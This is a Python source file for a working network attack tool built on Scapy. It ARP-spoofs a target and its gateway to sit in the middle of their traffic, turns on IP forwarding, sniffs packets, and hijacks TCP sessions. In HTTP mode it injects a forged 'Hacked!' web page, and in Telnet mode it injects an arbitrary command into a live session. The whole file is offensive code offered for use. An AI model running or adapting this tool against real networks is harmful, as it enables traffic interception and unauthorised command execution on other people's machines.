from scapy.all import *
from sys import exit, stdout
from threading import Thread
import argparse
import sys
import time
import platform
import globals
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def forge_response(p, proto):
    # Switch direction of packet
    ether = Ether(src=p[Ether].dst, dst=p[Ether].src)
    ip = IP(src=p[IP].dst, dst=p[IP].src)
    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + 1, flags="AP")

    if proto == 'http':
        # Craft HTTP response

        # Fake webpage
        path = 'poc.html'
        page = open(path, 'r')
        html = page.read()

        # Response headers
        http = "HTTP /1.1 200 OK\n"
        http += "Server: Hacked!\n"
        http += "Content-Type: text/html\n"
        http += "Content-Length: " + str(len(html)) + "\n"
        http += "Connection: close"
        http += "\n\n"
        http += html

        response = ether / ip / tcp / http

    elif proto == 'telnet':

        print(f"Received: SEQ {p[TCP].seq}, ACK {p[TCP].ack}, Payload {p[TCP].payload}")

        ip_total_len = p[IP].len
        ip_header_len = p[IP].ihl * 32 // 8
        tcp_header_len = p[TCP].dataofs * 32 // 8
        tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len

        # Send command to Telnet server
        cmd_ether = Ether(src=p[Ether].dst, dst=p[Ether].src)
        cmd_ip = IP(src=p[IP].dst, dst=p[IP].src)
        cmd_tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + tcp_seg_len, flags="PA")

        command = '\r\n' + globals.CMD + '\r\n'
        cmd = cmd_ether / cmd_ip / cmd_tcp / command

        response = cmd

    else:
        # TODO other types
        response = ""

    return response


def set_ip_forwarding(enable):
    """
    Enables IP forwarding through system commands depending on the OS

    Args:
        enable (bool): True if enable, False otherwise.
    """
    enable = int(enable)
    platform_name = platform.system()

    if platform_name == "Linux":
        # Linux
        os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(enable))

    elif platform_name == "Darwin":
        # OSX
        os.system('sysctl -w net.inet.ip.forwarding={}'.format(enable))
    # elif platform_name == "Windows":


def arp_scan(ip, interface):
    """
    Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
    Args:
        ip (str): An IP address or IP address range to scan. For example:
                    - 192.168.1.1 to scan a single IP address
                    - 192.168.1.1/24 to scan a range of IP addresses.
    Returns:
        A list of dictionaries mapping IP addresses to MAC addresses. For example:
        [
            {'IP': '192.168.2.1', 'MAC': 'c4:93:d9:8b:3e:5a'}
        ]
    """
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    ans, unans = srp(request, timeout=2, retry=1, verbose=0, iface=interface)
    result = []

    for sent, received in ans:
        result.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return result

def sniffer_thread(callback, filter, iface):
    while not globals.STOP_SNIFF:
        sniff(
            prn=callback,
            filter=filter,
            count=2,
            iface=iface
        )

def arp_spoof(targetIP, spoofIP, spoofMAC):
    """
    Performs an ARP spoofing attack against the target IP.
    Args:
        targetIP (str): An IP address to target.
        spoofIP (str): An IP address to spoof as.
        spoofMAC (str): The spoofed MAC address.
    """
    packet = ARP(op=2, pdst=targetIP, psrc=spoofIP, hwsrc=spoofMAC)
    send(packet, verbose=False)


def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
    """
    Restores the ARP cache after an ARP spoofing attack.

    Args:
        destinationIP (str): The target IP address.
        sourceIP (str): The IP address of the original host to be restored.
        destinationMAC (str): The target MAC address.
        sourceMAC (str): The MAC address of the original host to be restored.
    """
    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, count=4, verbose=False)


def set_ip_forwarding(enable):
    """
    Enables IP forwarding through system commands depending on the OS

    Args:
        enable (bool): True if enable, False otherwise.
    """
    enable = int(enable)
    platform_name = platform.system()

    if platform_name == "Linux":
        # Linux
        os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(enable))

    elif platform_name == "Darwin":
        # OSX
        os.system('sysctl -w net.inet.ip.forwarding={}'.format(enable))
    # elif platform_name == "Windows":


def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter, iface):

    packets = 0

    # Start packet forwarding thread
    print("[+] Packet forwarding enabled.")
    set_ip_forwarding(1)

    print("[+] Starting Packet Sniff.")

    sniffer = Thread(target=sniffer_thread, args=(callback, filter, iface))
    sniffer.start()

    time.sleep(5)

    # Begin ARP MITM attack
    print("[+] ARP MITM attack started.")
    try:
        while True:

            # Tell victim machine that I am the router.
            arp_spoof(targetIP, gatewayIP, myMAC)

            # Tell router that I am the victim machine.
            arp_spoof(gatewayIP, targetIP, myMAC)

            packets += 2
            if packets % 10 == 0:
                print("\r[+] Sent packets " + str(packets)),
            stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("[+] Interrupt detected, restoring to original state.")

        # Restore ARP cache
        arp_restore(targetIP, gatewayIP, targetMAC, gatewayMAC)
        arp_restore(gatewayIP, targetIP, gatewayMAC, targetMAC)

        print("[+] Packet forwarding disabled.")
        set_ip_forwarding(0)

        print("[+] Stopping Packet Sniff.")
        globals.STOP_SNIFF = True
        sniffer.join()


def hijack(p):

    if globals.PROTO == 'http':
        if 'GET' in str(p):
            response = forge_response(p, 'http')
            print('Spoofed Response: ', response.summary())
            sendp(response, verbose=0, iface=globals.IFACE)

    elif globals.PROTO == 'telnet':
        if globals.CMD not in str(p[TCP].payload):
            cmd = forge_response(p, 'telnet')
            print('Spoofed command: ', cmd[TCP].payload)

            print("[+] Executing command...")
            sendp(cmd, verbose=0, iface=globals.IFACE)

            sys.exit(0)


def main():
    
    parser = argparse.ArgumentParser()

    parser.add_argument(
        '-i', '--interface', default=conf.iface, help='Interface to use.'
    )

    parser.add_argument(
        'target', help='Target IP address.'
    )
    parser.add_argument(
        'gateway', help='Gateway IP address.'
    )

    subparsers = parser.add_subparsers(
        dest="proto", help="Higher level protocol to target.", required=True
    )

    http_subparser = subparsers.add_parser(
        'http', help='Perform HTTP connection hijacking.'
    )

    telnet_subparser = subparsers.add_parser(
        'telnet', help='Perform Telnet connection hijacking.'
    )

    telnet_subparser.add_argument(
        'cmd', help='A command to execute.'
    )

    args = parser.parse_args()

    globals.MY_MAC = get_if_hwaddr(args.interface)
    globals.MY_IP = get_if_addr(args.interface)
    globals.IFACE = args.interface

    print(f"My MAC: {globals.MY_MAC}\nMy IP: {globals.MY_IP}")
    print()

    print(f"[+] Determining target and gateway MAC address.")

    result = arp_scan(args.target, args.interface)
    if not result:
        print("\tCannot determine target MAC address. Are you sure the IP is correct?")
        sys.exit(1)
    else:
        targetMAC = result[0]['MAC']

    result = arp_scan(args.gateway, args.interface)
    if not result:
        print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
        sys.exit(1)
    else:
        gatewayMAC = result[0]['MAC']

    # Define packet forwarding source and destination
    globals.GATEWAY_MAC = gatewayMAC
    globals._SRC_DST = {
        gatewayMAC: targetMAC,
        targetMAC: gatewayMAC,
    }

    print(f"[+] Performing ARP poisoning MITM.")

    if args.proto == 'http':
        globals.PROTO = 'http'
        filter = f"ip and tcp port 80 and ether src {targetMAC}"

    elif args.proto == 'telnet':
        globals.PROTO = 'telnet'
        globals.CMD = args.cmd
        filter = f"ip and tcp port 23 and ether src {gatewayMAC}"

    arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, args.interface)


if __name__ == '__main__':
    main()
